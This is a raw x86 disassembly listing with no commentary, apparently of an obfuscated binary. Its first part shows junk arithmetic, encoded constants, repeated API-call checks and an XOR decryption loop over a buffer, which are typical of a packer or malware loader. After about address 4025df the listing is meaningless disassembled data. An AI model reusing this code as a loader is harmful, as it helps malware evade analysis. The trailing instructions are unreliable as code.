  401df8:	xor    DWORD PTR ds:0x434008,0x435014
  401e02:	push   0x43a520
  401e07:	push   ebx
  401e08:	push   ebx
  401e09:	call   DWORD PTR ds:0x43a8fc
  401e0f:	test   eax,eax
  401e11:	mov    DWORD PTR ds:0x435004,0x62c7
  401e1b:	jne    0x40241c
  401e21:	sub    DWORD PTR ds:0x437000,0x3add
  401e2b:	push   0xd
  401e2d:	push   0x43a530
  401e32:	call   DWORD PTR ds:0x43a908
  401e38:	test   eax,eax
  401e3a:	mov    DWORD PTR ds:0x435010,0x130a
  401e44:	jne    0x402440
  401e4a:	and    DWORD PTR ds:0x434018,0x434024
  401e54:	push   0x43a544
  401e59:	push   ebx
  401e5a:	push   ebx
  401e5b:	call   DWORD PTR ds:0x43a8ec
  401e61:	test   eax,eax
  401e63:	mov    DWORD PTR ds:0x436008,0x3823
  401e6d:	jne    0x402440
  401e73:	adc    DWORD PTR ds:0x436014,0x437014
  401e7d:	push   0x9
  401e7f:	sub    DWORD PTR ds:0x437014,0x437010
  401e89:	push   0x43a55c
  401e8e:	call   DWORD PTR ds:0x43a8cc
  401e94:	not    DWORD PTR ds:0x43800c
  401e9a:	test   eax,eax
  401e9c:	mov    DWORD PTR ds:0x43501c,0x69de
  401ea6:	jne    0x40241c
  401eac:	sbb    DWORD PTR ds:0x436018,0x435008
  401eb6:	push   0x43a578
  401ebb:	push   ebx
  401ebc:	sub    DWORD PTR ds:0x438018,0x435008
  401ec6:	push   ebx
  401ec7:	call   DWORD PTR ds:0x43a8fc
  401ecd:	test   eax,eax
  401ecf:	mov    DWORD PTR ds:0x435018,0x17d7
  401ed9:	jne    0x40241c
  401edf:	sub    DWORD PTR ds:0x436010,0x435008
  401ee9:	push   0xd
  401eeb:	adc    DWORD PTR ds:0x43700c,0x43400c
  401ef5:	push   0x43a588
  401efa:	sbb    DWORD PTR ds:0x437014,0x437000
  401f04:	call   DWORD PTR ds:0x43a908
  401f0a:	test   eax,eax
  401f0c:	mov    DWORD PTR ds:0x434024,0x6a5c
  401f16:	jne    0x402440
  401f1c:	mov    eax,DWORD PTR [ebp-0x8]
  401f1f:	and    DWORD PTR ds:0x43500c,0x0
  401f29:	mov    ecx,DWORD PTR ds:0x43500c
  401f2f:	inc    ecx
  401f30:	mov    DWORD PTR ds:0x43500c,ecx
  401f36:	cmp    DWORD PTR ds:0x43500c,0x9
  401f3d:	ja     0x401f75
  401f43:	jmp    0x401f4e
  401f48:	call   DWORD PTR ds:0x43a904
  401f4e:	cmp    DWORD PTR ds:0x43500c,0x8
  401f55:	jne    0x401f68
  401f5b:	mov    ecx,DWORD PTR ds:0x43500c
  401f61:	inc    ecx
  401f62:	mov    DWORD PTR ds:0x43500c,ecx
  401f68:	cmp    DWORD PTR ds:0x43500c,0x14
  401f6f:	jb     0x401f29
  401f75:	mov    ecx,DWORD PTR [ebp-0x7c]
  401f78:	xor    eax,esi
  401f7a:	dec    DWORD PTR ds:0x43700c
  401f80:	add    eax,edi
  401f82:	mov    DWORD PTR ds:0x434010,0x1014
  401f8c:	cmp    eax,ecx
  401f8e:	jne    0x4023c3
  401f94:	sbb    DWORD PTR ds:0x437018,0x6417
  401f9e:	mov    eax,DWORD PTR [ebp-0x8]
  401fa1:	mov    ecx,DWORD PTR ds:0x43a2d4
  401fa7:	and    DWORD PTR ds:0x438014,0xc31
  401fb1:	mov    ecx,DWORD PTR [ecx+0x198]
  401fb7:	xor    eax,esi
  401fb9:	sub    DWORD PTR ds:0x436008,0x435010
  401fc3:	add    eax,edi
  401fc5:	cmp    eax,DWORD PTR [ecx]
  401fc7:	jne    0x402025
  401fcd:	movzx  eax,WORD PTR ds:0x435014
  401fd4:	and    DWORD PTR ds:0x434010,eax
  401fda:	mov    eax,DWORD PTR [ebp-0x8]
  401fdd:	adc    DWORD PTR ds:0x434018,0x436008
  401fe7:	push   0xf89c8585
  401fec:	xor    eax,esi
  401fee:	add    eax,edi
  401ff0:	adc    DWORD PTR ds:0x437018,0x127f
  401ffa:	push   eax
  401ffb:	dec    DWORD PTR ds:0x436004
  402001:	push   0xf89c85b9
  402006:	sbb    DWORD PTR ds:0x43501c,0x43600c
  402010:	push   DWORD PTR [ebp-0xc]
  402013:	and    DWORD PTR ds:0x434024,0x7b2c
  40201d:	push   DWORD PTR [ebp-0x8]
  402020:	call   0x407a51
  402025:	mov    eax,DWORD PTR [ebp-0xc]
  402028:	mov    DWORD PTR [ebp-0x4c],eax
  40202b:	mov    eax,DWORD PTR [ebp-0x8]
  40202e:	mov    DWORD PTR [ebp-0x60],eax
  402031:	mov    eax,DWORD PTR [ebp-0x60]
  402034:	xor    eax,esi
  402036:	add    eax,edi
  402038:	mov    DWORD PTR [ebp+0x10],eax
  40203b:	mov    eax,ds:0x43a154
  402040:	mov    eax,DWORD PTR [eax]
  402042:	mov    DWORD PTR [ebp+0x10],eax
  402045:	mov    eax,ds:0x43a35c
  40204a:	mov    eax,DWORD PTR [eax]
  40204c:	mov    DWORD PTR [ebp-0x18],eax
  40204f:	mov    DWORD PTR [ebp+0xc],0xf89c8785
  402056:	mov    eax,DWORD PTR [ebp+0xc]
  402059:	xor    eax,esi
  40205b:	add    eax,edi
  40205d:	mov    DWORD PTR [ebp+0xc],eax
  402060:	mov    eax,ds:0x43a2d4
  402065:	mov    DWORD PTR [ebp+0xc],eax
  402068:	mov    eax,DWORD PTR [ebp+0x10]
  40206b:	mov    DWORD PTR [ebp+0xc],eax
  40206e:	mov    eax,DWORD PTR [ebp+0xc]
  402071:	push   0x4
  402073:	pop    ecx
  402074:	sub    ecx,eax
  402076:	add    ecx,DWORD PTR [ebp-0x18]
  402079:	mov    DWORD PTR [ebp-0x38],0xf89c85c5
  402080:	mov    DWORD PTR [ebp+0x10],ecx
  402083:	mov    DWORD PTR [ebp-0x108],0xf89c85b9
  40208d:	mov    eax,DWORD PTR [ebp+0xc]
  402090:	mov    DWORD PTR [ebp-0x104],eax
  402096:	mov    eax,DWORD PTR [ebp+0x10]
  402099:	mov    DWORD PTR [ebp-0x100],eax
  40209f:	mov    eax,DWORD PTR [ebp-0x38]
  4020a2:	xor    eax,esi
  4020a4:	add    eax,edi
  4020a6:	mov    DWORD PTR [ebp-0xfc],eax
  4020ac:	lea    eax,[ebp-0x98]
  4020b2:	mov    DWORD PTR [ebp-0xf8],eax
  4020b8:	mov    eax,DWORD PTR [ebp-0x108]
  4020be:	xor    eax,esi
  4020c0:	add    eax,edi
  4020c2:	mov    DWORD PTR [ebp-0x108],eax
  4020c8:	lea    eax,[ebp-0x108]
  4020ce:	push   eax
  4020cf:	mov    eax,DWORD PTR [ebp-0x4c]
  4020d2:	xor    eax,esi
  4020d4:	add    eax,edi
  4020d6:	push   eax
  4020d7:	mov    eax,ds:0x43a2f4
  4020dc:	push   0x43a24a
  4020e1:	push   DWORD PTR [eax]
  4020e3:	call   0x404c64
  4020e8:	mov    eax,DWORD PTR [ebp+0xc]
  4020eb:	mov    ecx,DWORD PTR [ebp+0x10]
  4020ee:	mov    DWORD PTR [ebp-0x84],ecx
  4020f4:	mov    ecx,DWORD PTR [ebp-0x60]
  4020f7:	xor    ecx,esi
  4020f9:	mov    DWORD PTR [ebp-0x18],eax
  4020fc:	add    ecx,edi
  4020fe:	jmp    0x402361
  402103:	lea    edx,[ecx+eax*1]
  402106:	mov    DWORD PTR [ebp+0x10],edx
  402109:	mov    edx,DWORD PTR [ebp-0x84]
  40210f:	sub    edx,ecx
  402111:	mov    DWORD PTR [ebp+0xc],edx
  402114:	mov    edx,DWORD PTR [ebp+0xc]
  402117:	mov    DWORD PTR [ebp-0x54],edx
  40211a:	mov    edx,DWORD PTR [ebp+0x10]
  40211d:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  402124:	mov    DWORD PTR [ebp-0x6c],edx
  402127:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  40212e:	mov    edx,DWORD PTR [ebp-0x50]
  402131:	xor    edx,esi
  402133:	add    edx,edi
  402135:	mov    DWORD PTR [ebp+0x10],edx
  402138:	mov    edx,DWORD PTR [ebp-0x50]
  40213b:	xor    edx,esi
  40213d:	add    edx,edi
  40213f:	mov    DWORD PTR [ebp+0xc],edx
  402142:	mov    DWORD PTR [ebp-0x68],0xf89c85a5
  402149:	mov    DWORD PTR [ebp-0x74],0xf89c85be
  402150:	mov    edx,DWORD PTR [ebp-0x50]
  402153:	mov    ebx,DWORD PTR [ebp-0x54]
  402156:	xor    edx,esi
  402158:	add    edx,edi
  40215a:	cmp    ebx,edx
  40215c:	je     0x402355
  402162:	mov    eax,DWORD PTR [ebp-0x24]
  402165:	xor    eax,esi
  402167:	mov    edx,0xffcd8d1e
  40216c:	sub    edx,eax
  40216e:	add    edx,DWORD PTR [ebp-0x54]
  402171:	mov    eax,DWORD PTR [ebp-0x24]
  402174:	mov    ebx,DWORD PTR [ebp+0x10]
  402177:	xor    eax,esi
  402179:	add    eax,edi
  40217b:	imul   eax,ebx
  40217e:	cmp    eax,edx
  402180:	ja     0x402352
  402186:	mov    edx,DWORD PTR [ebp+0x10]
  402189:	mov    eax,DWORD PTR [ebp-0x54]
  40218c:	mov    ebx,DWORD PTR [ebp-0x68]
  40218f:	sub    eax,edx
  402191:	xor    ebx,esi
  402193:	xor    edx,edx
  402195:	add    ebx,edi
  402197:	div    ebx
  402199:	mov    DWORD PTR [ebp+0xc],eax
  40219c:	mov    eax,DWORD PTR [ebp-0x74]
  40219f:	mov    edx,DWORD PTR [ebp+0xc]
  4021a2:	xor    eax,esi
  4021a4:	add    eax,edi
  4021a6:	cmp    edx,eax
  4021a8:	jbe    0x4021b8
  4021ae:	mov    eax,DWORD PTR [ebp-0x74]
  4021b1:	xor    eax,esi
  4021b3:	add    eax,edi
  4021b5:	mov    DWORD PTR [ebp+0xc],eax
  4021b8:	mov    eax,DWORD PTR [ebp-0x68]
  4021bb:	mov    edx,DWORD PTR [ebp+0xc]
  4021be:	xor    eax,esi
  4021c0:	add    eax,edi
  4021c2:	imul   eax,edx
  4021c5:	mov    DWORD PTR [ebp+0xc],eax
  4021c8:	mov    eax,DWORD PTR [ebp-0x50]
  4021cb:	mov    edx,DWORD PTR [ebp+0xc]
  4021ce:	xor    eax,esi
  4021d0:	add    eax,edi
  4021d2:	cmp    edx,eax
  4021d4:	je     0x40233b
  4021da:	mov    eax,DWORD PTR [ebp+0xc]
  4021dd:	mov    DWORD PTR [ebp-0x3c],eax
  4021e0:	mov    eax,DWORD PTR [ebp+0x10]
  4021e3:	add    eax,DWORD PTR [ebp-0x6c]
  4021e6:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  4021ed:	mov    DWORD PTR [ebp-0x30],eax
  4021f0:	mov    eax,0xf89c8584
  4021f5:	mov    DWORD PTR [ebp-0x64],eax
  4021f8:	mov    DWORD PTR [ebp-0x58],0xf89c85bb
  4021ff:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  402206:	mov    DWORD PTR [ebp-0x2c],eax
  402209:	mov    eax,DWORD PTR [ebp-0x38]
  40220c:	xor    eax,esi
  40220e:	add    eax,edi
  402210:	jmp    0x4022f7
  402215:	mov    DWORD PTR [ebp-0x78],0xf89c85b3
  40221c:	mov    DWORD PTR [ebp-0x80],0xf89c85a9
  402223:	mov    eax,DWORD PTR [ebp-0x2c]
  402226:	mov    edx,DWORD PTR [ebp+0xc]
  402229:	xor    eax,esi
  40222b:	add    eax,edi
  40222d:	imul   eax,edx
  402230:	mov    edx,DWORD PTR [ebp-0x30]
  402233:	mov    al,BYTE PTR [eax+edx*1]
  402236:	mov    BYTE PTR [ebp-0x1],al
  402239:	mov    eax,DWORD PTR [ebp-0x2c]
  40223c:	mov    edx,DWORD PTR [ebp+0xc]
  40223f:	xor    eax,esi
  402241:	add    eax,edi
  402243:	imul   eax,edx
  402246:	mov    edx,DWORD PTR [ebp-0x58]
  402249:	xor    edx,esi
  40224b:	add    eax,edx
  40224d:	mov    edx,DWORD PTR [ebp-0x30]
  402250:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  402258:	mov    edx,DWORD PTR [ebp-0x78]
  40225b:	xor    edx,esi
  40225d:	lea    eax,[edx+eax*1+0x3272e2]
  402264:	movzx  edx,BYTE PTR [ebp-0x1]
  402268:	xor    edx,eax
  40226a:	mov    BYTE PTR [ebp-0x1],dl
  40226d:	mov    al,BYTE PTR [ebp-0x1]
  402270:	mov    edx,DWORD PTR [ebp-0x2c]
  402273:	mov    ebx,DWORD PTR [ebp+0xc]
  402276:	xor    edx,esi
  402278:	add    edx,edi
  40227a:	imul   edx,ebx
  40227d:	mov    ebx,DWORD PTR [ebp-0x30]
  402280:	mov    BYTE PTR [edx+ebx*1],al
  402283:	mov    eax,DWORD PTR [ebp-0x2c]
  402286:	mov    edx,DWORD PTR [ebp+0xc]
  402289:	xor    eax,esi
  40228b:	add    eax,edi
  40228d:	imul   eax,edx
  402290:	mov    edx,DWORD PTR [ebp-0x30]
  402293:	mov    al,BYTE PTR [eax+edx*1]
  402296:	mov    BYTE PTR [ebp-0x1],al
  402299:	mov    eax,DWORD PTR [ebp-0x2c]
  40229c:	mov    edx,DWORD PTR [ebp+0xc]
  40229f:	xor    eax,esi
  4022a1:	add    eax,edi
  4022a3:	imul   eax,edx
  4022a6:	mov    edx,DWORD PTR [ebp-0x64]
  4022a9:	xor    edx,esi
  4022ab:	add    eax,edx
  4022ad:	mov    edx,DWORD PTR [ebp-0x30]
  4022b0:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  4022b8:	mov    edx,DWORD PTR [ebp-0x80]
  4022bb:	xor    edx,esi
  4022bd:	lea    eax,[edx+eax*1+0x3272e2]
  4022c4:	movzx  edx,BYTE PTR [ebp-0x1]
  4022c8:	xor    edx,eax
  4022ca:	mov    BYTE PTR [ebp-0x1],dl
  4022cd:	mov    al,BYTE PTR [ebp-0x1]
  4022d0:	mov    edx,DWORD PTR [ebp-0x2c]
  4022d3:	mov    ebx,DWORD PTR [ebp+0xc]
  4022d6:	xor    edx,esi
  4022d8:	add    edx,edi
  4022da:	imul   edx,ebx
  4022dd:	mov    ebx,DWORD PTR [ebp-0x30]
  4022e0:	mov    BYTE PTR [edx+ebx*1],al
  4022e3:	mov    eax,DWORD PTR [ebp-0x10]
  4022e6:	mov    edx,DWORD PTR [ebp-0x64]
  4022e9:	xor    eax,esi
  4022eb:	xor    edx,esi
  4022ed:	add    eax,edi
  4022ef:	add    edx,edi
  4022f1:	imul   eax,edx
  4022f4:	add    eax,DWORD PTR [ebp+0xc]
  4022f7:	mov    DWORD PTR [ebp+0xc],eax
  4022fa:	mov    eax,DWORD PTR [ebp+0xc]
  4022fd:	mov    edx,DWORD PTR [ebp-0x3c]
  402300:	cmp    edx,eax
  402302:	jb     0x402215
  402308:	mov    eax,DWORD PTR [ebp-0x64]
  40230b:	mov    edx,DWORD PTR [ebp-0x3c]
  40230e:	xor    eax,esi
  402310:	add    eax,edi
  402312:	imul   eax,edx
  402315:	mov    edx,DWORD PTR [ebp-0x38]
  402318:	xor    edx,esi
  40231a:	add    edx,edi
  40231c:	or     eax,edx
  40231e:	mov    edx,DWORD PTR [ebp-0x24]
  402321:	xor    edx,esi
  402323:	add    eax,edx
  402325:	mov    edx,DWORD PTR [ebp-0x24]
  402328:	xor    edx,esi
  40232a:	add    eax,edx
  40232c:	mov    edx,DWORD PTR [ebp+0x10]
  40232f:	lea    eax,[eax+edx*1+0x64e5c4]
  402336:	jmp    0x40234a
  40233b:	mov    eax,DWORD PTR [ebp-0x24]
  40233e:	mov    edx,DWORD PTR [ebp+0x10]
  402341:	xor    eax,esi
  402343:	lea    eax,[eax+edx*1+0x3272e2]
  40234a:	mov    DWORD PTR [ebp+0x10],eax
  40234d:	jmp    0x402162
  402352:	mov    eax,DWORD PTR [ebp-0x18]
  402355:	mov    edx,DWORD PTR [ebp-0x4c]
  402358:	xor    edx,esi
  40235a:	lea    ecx,[ecx+edx*1+0x3272e2]
  402361:	lea    edx,[ecx-0x3272e2]
  402367:	xor    edx,esi
  402369:	cmp    edx,0xf89c9585
  40236f:	jne    0x402103
  402375:	mov    ecx,DWORD PTR [ebp-0x60]
  402378:	mov    edx,DWORD PTR [ebp-0x4c]
  40237b:	mov    ebx,DWORD PTR [ebp-0x60]
  40237e:	xor    edx,esi
  402380:	mov    dl,BYTE PTR [edx+eax*1+0x3272e2]
  402387:	xor    ecx,esi
  402389:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  402390:	xor    ebx,esi
  402392:	mov    BYTE PTR [ebx+eax*1+0x3272e2],dl
  402399:	mov    edx,DWORD PTR [ebp-0x4c]
  40239c:	xor    edx,esi
  40239e:	mov    BYTE PTR [edx+eax*1+0x3272e2],cl
  4023a5:	mov    eax,DWORD PTR [ebp-0x4c]
  4023a8:	mov    eax,DWORD PTR [ebp-0x8]
  4023ab:	xor    eax,esi
  4023ad:	add    eax,edi
  4023af:	mov    ds:0x43a358,eax
  4023b4:	mov    eax,DWORD PTR [ebp-0x8]
  4023b7:	xor    eax,esi
  4023b9:	add    eax,edi
  4023bb:	xor    ebx,ebx
  4023bd:	mov    ds:0x43a350,eax
  4023c2:	inc    ebx
  4023c3:	lea    eax,[ebp-0x40]
  4023c6:	mov    DWORD PTR [ebp-0x88],eax
  4023cc:	lea    eax,[ebp+0x4]
  4023cf:	mov    DWORD PTR [ebp-0x40],eax
  4023d2:	mov    eax,DWORD PTR [ebp-0x40]
  4023d5:	test   eax,eax
  4023d7:	je     0x402572
  4023dd:	push   0x43a59c
  4023e2:	push   ebx
  4023e3:	push   ebx
  4023e4:	call   DWORD PTR ds:0x43a8ec
  4023ea:	test   eax,eax
  4023ec:	jne    0x402440
  4023f2:	push   0x9
  4023f4:	push   0x43a5b4
  4023f9:	call   DWORD PTR ds:0x43a8cc
  4023ff:	test   eax,eax
  402401:	jne    0x40241c
  402407:	push   0x43a5d0
  40240c:	push   ebx
  40240d:	push   ebx
  40240e:	call   DWORD PTR ds:0x43a8fc
  402414:	test   eax,eax
  402416:	je     0x40242b
  40241c:	lea    eax,[ebp-0x20]
  40241f:	push   eax
  402420:	call   DWORD PTR ds:0x43a8bc
  402426:	jmp    0x40258d
  40242b:	push   0xd
  40242d:	push   0x43a5e0
  402432:	call   DWORD PTR ds:0x43a908
  402438:	test   eax,eax
  40243a:	je     0x402447
  402440:	xor    eax,eax
  402442:	jmp    0x40258d
  402447:	mov    DWORD PTR [ebp-0x94],0xf152c3c
  402451:	mov    DWORD PTR [ebp-0xa0],0x712ed0f
  40245b:	mov    DWORD PTR [ebp-0x8c],0x373fc2d
  402465:	mov    DWORD PTR [ebp-0x90],0x72670a1d
  40246f:	call   0x405387
  402474:	mov    eax,DWORD PTR [ebp-0x28]
  402477:	mov    eax,DWORD PTR [ebp-0xc]
  40247a:	mov    eax,DWORD PTR [ebp-0x8]
  40247d:	mov    DWORD PTR [ebp+0xc],eax
  402480:	mov    eax,eax
  402482:	mov    eax,ds:0x43a2d4
  402487:	mov    eax,DWORD PTR [eax+0x1c8]
  40248d:	mov    eax,DWORD PTR [eax]
  40248f:	cdq    
  402490:	mov    ebx,eax
  402492:	mov    eax,0xfabdbee7
  402497:	add    ebx,eax
  402499:	adc    edx,0xffffffff
  40249c:	and    DWORD PTR [ebp-0x10],0x0
  4024a0:	xor    edx,0x0
  4024a3:	mov    DWORD PTR [ebp-0x6c],edx
  4024a6:	mov    edx,DWORD PTR [ebp+0xc]
  4024a9:	mov    DWORD PTR [ebp-0x14],edx
  4024ac:	mov    ecx,0x8a29a12d
  4024b1:	xor    ebx,ecx
  4024b3:	add    DWORD PTR [ebp-0x14],eax
  4024b6:	mov    edx,DWORD PTR [ebp-0x14]
  4024b9:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4024bd:	xor    edx,ecx
  4024bf:	mov    DWORD PTR [ebp-0x5c],edx
  4024c2:	mov    edx,DWORD PTR [ebp-0x10]
  4024c5:	xor    edx,0x0
  4024c8:	mov    DWORD PTR [ebp-0x58],edx
  4024cb:	cmp    DWORD PTR [ebp-0x5c],ebx
  4024ce:	jne    0x4024e0
  4024d4:	mov    edx,DWORD PTR [ebp-0x6c]
  4024d7:	cmp    DWORD PTR [ebp-0x58],edx
  4024da:	je     0x40250f
  4024e0:	mov    edx,DWORD PTR ds:0x43a2d4
  4024e6:	mov    edx,DWORD PTR [edx+0x1c0]
  4024ec:	mov    edx,DWORD PTR [edx]
  4024ee:	xor    ebx,ebx
  4024f0:	add    edx,eax
  4024f2:	adc    ebx,0xffffffff
  4024f5:	xor    edx,ecx
  4024f7:	xor    ebx,0x0
  4024fa:	cmp    edx,0x70941fc5
  402500:	jne    0x402572
  402506:	cmp    ebx,0xffffffff
  402509:	jne    0x402572
  40250f:	mov    edx,DWORD PTR ds:0x43a350
  402515:	mov    ebx,DWORD PTR ds:0x43a358
  40251b:	xor    edx,ebx
  40251d:	mov    DWORD PTR ds:0x43a350,edx
  402523:	mov    edx,DWORD PTR [ebp-0x40]
  402526:	mov    ebx,DWORD PTR ds:0x43a350
  40252c:	add    ebx,DWORD PTR [edx]
  40252e:	mov    edx,DWORD PTR [ebp-0x40]
  402531:	mov    DWORD PTR [edx],ebx
  402533:	mov    edx,DWORD PTR [ebp+0xc]
  402536:	xor    esi,edx
  402538:	mov    edx,DWORD PTR ds:0x43a350
  40253e:	add    esi,edi
  402540:	xor    ebx,ebx
  402542:	add    esi,eax
  402544:	adc    ebx,0xffffffff
  402547:	xor    edi,edi
  402549:	xor    esi,ecx
  40254b:	xor    ebx,0x0
  40254e:	add    edx,eax
  402550:	adc    edi,0xffffffff
  402553:	xor    edx,ecx
  402555:	xor    edi,0x0
  402558:	cmp    edx,esi
  40255a:	jne    0x402572
  402560:	cmp    edi,ebx
  402562:	jne    0x402572
  402568:	mov    eax,ds:0x43a350
  40256d:	mov    ds:0x43a358,eax
  402572:	mov    eax,ds:0x43a2d4
  402577:	push   0x4
  402579:	add    eax,0x1cc
  40257e:	push   eax
  40257f:	lea    eax,[ebp-0x28]
  402582:	push   eax
  402583:	call   0x402598
  402588:	mov    eax,DWORD PTR [ebp-0x28]
  40258b:	mov    eax,DWORD PTR [eax]
  40258d:	pop    edi
  40258e:	pop    ebx
  40258f:	pop    esi
  402590:	leave  
  402591:	ret    0xc
  402594:	xor    eax,eax
  402596:	inc    eax
  402597:	ret    
  402598:	push   ebp
  402599:	mov    ebp,esp
  40259b:	sub    esp,0x10
  40259e:	mov    ecx,DWORD PTR ds:0x438004
  4025a4:	sbb    ecx,DWORD PTR ds:0x434000
  4025aa:	mov    DWORD PTR ds:0x438004,ecx
  4025b0:	mov    eax,0xf89c8585
  4025b5:	add    DWORD PTR ds:0x437018,0x7358
  4025bf:	mov    DWORD PTR [ebp-0x4],eax
  4025c2:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4025c9:	movzx  edx,WORD PTR ds:0x436014
  4025d0:	sub    DWORD PTR ds:0x43701c,edx
  4025d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4025d9:	dec    edx
  4025da:	jmp    0x404996
  4025df:	sub    DWORD PTR [edx+0x13b763cc],eax
  4025e5:	jae    0x402659
  4025e7:	xchg   ecx,eax
  4025e8:	xchg   esp,eax
  4025e9:	pop    ecx
  4025ea:	int3   
  4025eb:	or     eax,0x7cd4490b
  4025f0:	jl     0x40266e
  4025f2:	jl     0x4025c7
  4025f4:	pop    edi
  4025f5:	jl     0x402673
  4025f7:	adc    eax,0x1139172e
  4025fc:	and    eax,0x30652f13
  402601:	popa   
  402602:	pusha  
  402603:	(bad)  
  402605:	ins    BYTE PTR es:[edi],dx
  402606:	ins    BYTE PTR es:[edi],dx
  402607:	ins    DWORD PTR es:[edi],dx
  402608:	xor    al,0xc5
  40260a:	fdivp  st(1),st
  40260c:	push   0x42
  40260e:	arpl   WORD PTR [ecx+0x53],di
  402611:	stos   BYTE PTR es:[edi],al
  402612:	jp     0x402681
  402614:	push   ecx
  402615:	iret   
  402616:	pop    ebp
  402617:	dec    esp
  402618:	cmp    cl,BYTE PTR [esi+0x577087fc]
  40261e:	dec    ebp
  40261f:	jg     0x402658
  402621:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402627:	jmp    DWORD PTR cs:[eax-0x22]
  40262b:	cld    
  40262c:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402630:	xor    ebp,ecx
  402632:	mov    esp,0xd82b87ed
  402637:	and    DWORD PTR [ecx],0xf
  40263a:	push   ecx
  40263b:	mov    ds:0x6df7c68c,eax
  402640:	fld    QWORD PTR [esi]
  402642:	(bad)  
  402643:	or     ah,bh
  402645:	and    BYTE PTR [edx],dl
  402647:	inc    edx
  402648:	push   cs
  402649:	and    BYTE PTR [ebx+0x62],ah
  40264c:	mov    cl,0xaf
  40264e:	sub    ebx,DWORD PTR [ecx+0x5]
  402651:	mov    al,ds:0x2341e1ff
  402656:	jbe    0x40268c
  402658:	ret    0xf153
  40265b:	sbb    al,0xfc
  40265d:	jb     0x402618
  40265f:	jnp    0x40263e
  402661:	xchg   edx,eax
  402662:	pop    edi
  402663:	cmp    DWORD PTR [ecx+0x49841607],0xb
  40266a:	cwde   
  40266b:	ds je  0x4025f9
  40266e:	add    ebx,esp
  402670:	sub    eax,0x4b368d54
  402675:	push   esi
  402676:	sti    
  402677:	iret   
  402678:	mov    WORD PTR [ecx],fs
  40267a:	or     edx,0x6982ceb7
  402680:	out    0x45,al
  402682:	push   esp
  402683:	dec    esi
  402684:	push   cs
  402685:	cmp    BYTE PTR [ebx],cl
  402687:	xor    BYTE PTR [ebx],bl
  402689:	lods   eax,DWORD PTR ds:[esi]
  40268a:	inc    ebx
  40268b:	int3   
  40268c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40268d:	dec    edx
  40268e:	fiadd  DWORD PTR [esi]
  402690:	push   eax
  402691:	std    
  402692:	push   esp
  402693:	push   eax
  402694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402695:	icebp  
  402696:	bound  edi,QWORD PTR [edi+0x641344f2]
  40269c:	xchg   ebx,eax
  40269d:	add    ebp,esi
  40269f:	mov    ebp,0xdcf8f95f
  4026a4:	jae    0x402633
  4026a6:	push   cs
  4026a7:	jns    0x4026a4
  4026a9:	retf   0x78f3
  4026ac:	(bad)  
  4026ad:	scas   eax,DWORD PTR es:[edi]
  4026ae:	xor    BYTE PTR [ebp+0x79],0xd9
  4026b2:	push   ecx
  4026b3:	cmp    BYTE PTR [edi-0x76],dl
  4026b6:	jmp    0x2f29:0xda9e595a
  4026bd:	push   cs
  4026be:	and    BYTE PTR [ecx-0x2d],dh
  4026c1:	(bad)  
  4026c3:	div    DWORD PTR [ecx]
  4026c5:	jp     0x40271e
  4026c7:	rcl    dh,0xa2
  4026ca:	pop    ecx
  4026cb:	and    DWORD PTR [edx],esp
  4026cd:	jge    0x402715
  4026cf:	xor    DWORD PTR [esi-0x2e5172be],esp
  4026d5:	mov    ds:0x73b1b93c,al
  4026da:	adc    ebp,DWORD PTR [ebp-0x62f69988]
  4026e0:	dec    dl
  4026e2:	shl    BYTE PTR [ebp+0x7c],1
  4026e5:	lea    ebx,[eax+0x5366e199]
  4026eb:	fist   WORD PTR [edi-0x20b243f2]
  4026f1:	inc    ebx
  4026f2:	inc    esp
  4026f3:	cmp    DWORD PTR [ebp-0x38],ecx
  4026f6:	adc    eax,0xc36f69a4
  4026fb:	(bad)  
  4026fc:	in     eax,0x63
  4026fe:	sub    ch,bh
  402700:	jle    0x402721
  402702:	jg     0x4026fc
  402704:	xchg   esi,eax
  402705:	(bad)  
  402706:	in     eax,0x5
  402708:	(bad)  
  40270a:	jl     0x4026bd
  40270c:	sub    DWORD PTR [esi],edx
  40270e:	push   ds
  40270f:	inc    ecx
  402710:	cs stos DWORD PTR es:[edi],eax
  402712:	retf   
  402713:	add    edx,DWORD PTR [ebx+0x3aeb7e39]
  402719:	sub    edi,DWORD PTR [ebp+0x64]
  40271c:	fwait
  40271d:	and    eax,0xff850b61
  402722:	xlat   BYTE PTR ds:[ebx]
  402723:	xlat   BYTE PTR ds:[ebx]
  402724:	pop    eax
  402725:	push   cs
  402726:	ror    dl,0x64
  402729:	pop    ebp
  40272a:	jb     0x402783
  40272c:	dec    edx
  40272d:	push   ss
  40272e:	pusha  
  40272f:	cs jmp 0xb5b3d7e0
  402735:	fwait
  402736:	rol    ebx,0x8d
  402739:	repnz xchg ebp,eax
  40273b:	mov    al,ds:0xa1b53253
  402740:	dec    esi
  402741:	popa   
  402742:	loope  0x40274f
  402744:	or     eax,0x775082c3
  402749:	test   BYTE PTR [eax],al
  40274b:	into   
  40274c:	aad    0x5b
  40274e:	jmp    0xc355:0xb32993e7
  402755:	mov    al,ds:0x879b65c9
  40275a:	out    0x93,eax
  40275c:	adc    DWORD PTR [eax-0x64f56a32],esi
  402762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402763:	add    edx,DWORD PTR [ecx-0x4b]
  402766:	nop
  402767:	cdq    
  402768:	inc    ebp
  402769:	bound  esi,QWORD PTR [eax-0x16125daa]
  40276f:	out    dx,eax
  402770:	jmp    0xce2d:0xd3cc3753
  402777:	xor    edi,DWORD PTR [edi+edx*2]
  40277a:	mov    dl,0x5d
  40277c:	cdq    
  40277d:	and    al,0x25
  40277f:	inc    edx
  402780:	in     al,0x45
  402782:	xor    DWORD PTR [ebp+0x66],esi
  402785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402786:	jo     0x402803
  402788:	or     DWORD PTR [eax+0x22],edx
  40278b:	jecxz  0x4027b7
  40278d:	test   eax,0xda8eac3c
  402792:	push   edi
